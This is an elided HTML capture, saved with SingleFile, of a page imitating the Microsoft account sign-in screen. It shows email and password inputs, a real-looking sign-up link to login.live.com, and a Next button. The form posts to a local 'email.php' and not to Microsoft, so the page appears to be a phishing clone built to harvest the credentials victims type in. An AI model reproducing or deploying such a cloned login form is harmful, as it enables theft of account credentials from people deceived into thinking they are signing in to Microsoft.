...
Page saved with SingleFile
 ...
 saved date: Thu May 06 2021 19:51:58 GMT+0800 (China Standard Time)
--><meta charset=utf-8>
...
<form name="f1" id="i0281" spellcheck="false" method="post" target="_top" autocomplete="off" action="email.php">
...
<div class=row>
 ...
 <input type=email name="loginfmt" id=i0116 maxlength=113 lang=en class="form-control ltr_override input ext-input text-box ext-text-box" aria-required=true data-bind="
                    ...
                    placeholder: $placeholderText" aria-label="Enter your email, phone, or Skype." aria-describedby=loginHeader placeholder="Email, phone, or Skype" value>
 <input name=passwd type=password id=i0118 autocomplete=off data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class=moveOffScreen tabindex=-1 aria-hidden=true value>
 ...
 <div class=form-group data-bind="
                    ...
                    childBindings: {
                        'signup': {
                            ...
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAYVQPUvDQADNNU3aBvxARJykQwcRLrm75NJe0EHxAz8rRZF2keRyaSPGSBsFHQXBUdx0dHRTQcVJHDs5Sn-BODk6mv4CefDg8Yb3oSlYRzqbkrGOnRIVJhc2R5B4OIAWqVBY8S0PlqkQ5UoK07LbI9qwUX_aHzvtLZz5E5lBsqXcgMLufngsdB5Hd2CilSSHHccwEuFGHT0KeTvuxEHSd41m_ALABwBfANxlSqbFAyx8D1LhMmiVWQAZcwnkdhpVZgQRm_cyQ9XZo6RF-hS3w1NxI5cI85kIuAtNG6VNbW5Cz_Y4DExMueVWOKfWg6ymiVF88CmDjyz4zo7lwbA0XihKkzkkO_m8liqpKP1mwa2Srro_mMlNb59Xn68e17vX71JXMXaCZY9tBOHhmjiprjX8hXCDos25vflo9WSJuGix1qrW9pYMUW_OIAdfqmpXzax0flRwkZNeC_880dNG04UYIgqRXcTYodgxrcbbgPQH0&amp;estsfed=1&amp;uaid=6cb6592f7a1645da82641e020e325405&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=5e3ce6c0-2b1f-4285-8d4b-75ee78787346" id=signup aria-label="Create a Microsoft account">Create one!</a></div>
...
<div class=win-button-pin-bottom data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
 ...
 <input type="submit" id=idSIButton9  class="button ext-button primary ext-primary" value=Next>
 </div>
</div></div>
 </div>
</div>
